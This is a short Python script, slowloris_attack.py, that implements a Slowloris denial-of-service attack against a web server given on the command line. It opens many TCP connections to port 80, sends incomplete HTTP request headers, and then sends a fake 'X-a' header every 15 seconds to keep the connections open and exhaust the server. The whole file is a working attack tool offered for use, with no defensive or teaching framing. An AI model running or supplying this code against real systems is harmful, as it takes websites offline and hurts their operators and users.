# slowloris_attack.py

import socket
import time # for sleeping between sends
import random # random request values
import sys

def slow_attack(target_ip, num_connections):
    list_of_sockets = []
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    print(f"Starting slowloris attack on {target_ip} with {num_connections} connections.")

    # Starts by opening multiple TCP sockets to the target.
    for _ in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, 80))
            list_of_sockets.append(s)
        except socket.error as e:
            print(f"Socket creation failed: {e}")
            break

    # Send partial HTTP request
    for s in list_of_sockets:
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"User-Agent: {user_agent}\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))

    try:
        # Keep-alive loop
        # Every 15 seconds, it sends a fake header (X-a) with random values.
        while True:
            print(f"Sending keep-alive headers... Sockets open: {len(list_of_sockets)}")
            for s in list(list_of_sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
            
            time.sleep(15)
    except KeyboardInterrupt:
        print("\nAttack stopped.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python slowloris_attack.py <hostname> <connections_to_make>")
        sys.exit(1)

    target_hostname = sys.argv[1]
    num_connections = int(sys.argv[2])
    
    slow_attack(target_hostname, num_connections)